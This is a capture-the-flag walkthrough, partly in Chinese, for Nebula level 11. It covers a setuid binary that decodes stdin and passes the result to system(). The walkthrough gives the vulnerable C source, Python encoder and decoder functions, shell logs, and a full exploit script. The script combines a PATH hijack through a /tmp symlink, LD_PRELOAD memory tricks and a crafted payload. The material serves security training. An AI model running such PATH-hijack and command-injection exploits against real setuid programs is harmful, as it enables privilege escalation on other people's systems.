# level11

#### About

The /home/flag11/flag11 binary processes standard input and executes a shell command. 
There are two ways of completing this level, you may wish to do both :-) 
To do this level, log in as the level11 account with the password level11. Files for this level can be found in /home/flag11. 


#### Sources

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
	char *tmp;
	int pid;
	int fd;

	srandom(time(NULL));

	tmp = getenv("TEMP");
	pid = getpid();
	
	asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid, 
		'A' + (random() % 26), '0' + (random() % 10), 
		'a' + (random() % 26), 'A' + (random() % 26),
		'0' + (random() % 10), 'a' + (random() % 26));

	fd = open(*path, O_CREAT|O_RDWR, 0600);
	unlink(*path);
	return fd;
}

void process(char *buffer, int length)
{
	unsigned int key;
	int i;

	key = length & 0xff;

	for(i = 0; i < length; i++) {
		buffer[i] ^= key;
		key -= buffer[i];
	}

	system(buffer);
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
	char line[256];
	char buf[1024];
	char *mem;
	int length;
	int fd;
	char *path;

	if(fgets(line, sizeof(line), stdin) == NULL) {
		errx(1, "reading from stdin");
	}

	if(strncmp(line, CL, strlen(CL)) != 0) {
		errx(1, "invalid header");
	}

	printf("%s",line + strlen(CL));

	length = atoi(line + strlen(CL));
	
	if(length < sizeof(buf)) {
		if(fread(buf, length, 1, stdin) != length) {
			err(1, "fread length");
		}
		process(buf, length);
	} else {
		int blue = length;
		int pink;

		fd = getrand(&path);

		while(blue > 0) {
			printf("blue = %d, length = %d, ", blue, length);

			pink = fread(buf, 1, sizeof(buf), stdin);
			printf("pink = %d\n", pink);

			if(pink <= 0) {
				err(1, "fread fail(blue = %d, length = %d)", blue, length);
			}
			write(fd, buf, pink);

			blue -= pink;
		}	

		mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
		if(mem == MAP_FAILED) {
			err(1, "mmap");
		}
		process(mem, length);
	}

}
```


#### Solutions

Python函数Process实现了C源码中的Process函数的功能，
de_Process函数，用于解密Process函数。

```
def process(buffer_, length):
    '''level11 -- function process'''
    key = length & 0xff
    ret = []

    for s in buffer_:
        _char = ord(s)
        _char ^= key

        d = _char & 0xff
        d = chr(d)

        key -= _char

        ret.append(d)

        # print "%s --> %s    key: %s" % (s, d, key)

    return "".join(ret)


def de_process(buffer_, length):
    '''level11 -- decode function process'''
    key = length & 0xff
    ret = []

    for s in buffer_:
        _char = ord(s)
        _char ^= key

        d = _char & 0xff
        d = chr(d)

        key -= (_char ^ key)

        ret.append(d)

        # print "%s --> %s    key: %s" % (s, d, key)

    return "".join(ret)
```

传入单个字符b，会被转码为c*(*代表其他字符)，
由于缓冲区未被初始化为00，导致转换输出的内容后面包含其他字符.测试如下: 


##### 方案一. length < 1024

```
详见代码: exploit_1

level11@nebula:/tmp$ export PATH=/tmp:$PATH
level11@nebula:/tmp$ ln -s /bin/getflag /tmp/c
level11@nebula:/tmp$ echo -ne 'Content-Length: 1\nb\00' | /home/flag11/flag11 
0x63
c�
  sh: $'c\260\344': command not found
level11@nebula:/tmp$ echo -ne 'Content-Length: 1\nb\00' | /home/flag11/flag11 
0x63
c0
  sh: $'c0\304': command not found
level11@nebula:/tmp$ echo -ne 'Content-Length: 1\nb\00' | /home/flag11/flag11 
0x63
c .
getflag is executing on a non-flag account, this doesn't count

为了避免上面的问题，使用LD_PRELOAD对内存进行初始化.

level11@nebula/tmp$: export LD_PRELOAD=`python -c 'print "\x00"*3'`    --------> ####

系统成功执行命令，但用户身份不对。网上说法: system() 函数调用时，未做相关的权限操作。
level11@nebula:/tmp$ echo -ne 'Content-Length: 1\nb' | /home/flag11/flag11 
uid=1012(level11) gid=1012(level11) groups=1012(level11)
```

##### 方案二. length >= 1024
```
详见代码: exploit_2


Recommends
http://uberskill.blogspot.com/2012/09/nebula-level11.html
http://github.com/1u4nx/Exploit-Exercises-Nebula/
http://v0ids3curity.blogspot.com/2012/12/exploit-exercise-level-11.html
http://hanjc.me/blog/2014/01/26/nebula-level11/
http://cybergibbons.com/security-2/nebula-walkthrough/nebula-exploit-exercises-walkthrough-level11/

http://stackoverflow.com/questions/16258830/does-system-syscall-drop-privileges


Exploits

攻击代码如下: 
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import os

'''
void process(char *buffer, int length)
{
        unsigned int key;
        int i;
        key = length & 0xff;

        for(i = 0; i < length; i++) {
            buffer[i] ^= key;
            key -= buffer[i];
        }
        system(buffer);
        }

'''


def process(buffer_, length):
    '''level11 -- function process'''
    key = length & 0xff
    ret = []

    for s in buffer_:
        _char = ord(s)
        _char ^= key

        d = _char & 0xff
        d = chr(d)

        key -= _char

        ret.append(d)

        # print "%s --> %s    key: %s" % (s, d, key)

    return "".join(ret)


def de_process(buffer_, length):
    '''level11 -- decode function process'''
    key = length & 0xff
    ret = []

    for s in buffer_:
        _char = ord(s)
        _char ^= key

        d = _char & 0xff
        d = chr(d)

        key -= (_char ^ key)

        ret.append(d)

        # print "%s --> %s    key: %s" % (s, d, key)

    return "".join(ret)


def exploit_1(cmd):
    '''input < 1024'''
    # cmd = "/usr/bin/id"
    _input = 's'

    length = len(_input)
    ret = process(_input, length)

    cmds = ['cd /tmp;',
            'rm -f /tmp/%s;' % _input,
            'ln -s %s /tmp/%s;' % (cmd, _input),
            'export PATH=/tmp:$PATH;',
            'export LD_PRELOAD=%s;' % ("\xFF" * (length + 1))]

    [os.system(c) for c in cmds]

    payload = "Content-Length: %d\n%s\00" % (length, ret)

    print payload
    return payload


def exploit_2(cmd):
    '''input >= 1024'''
    _i = 's' + '\00' * 1023
    length = len(_i)
    ret = process(_i, length)

    cmds = ['export TEMP=/tmp;',
            'export LD_PRELOAD=%s' % (length)]

    [os.system(c) for c in cmds]

    payload = "Content-Length: %d\n%s\00" % (length, ret)
    print payload


if __name__ == "__main__":
    exploit_1("/usr/bin/id")
    # exploit_2("/usr/bin/id")
```
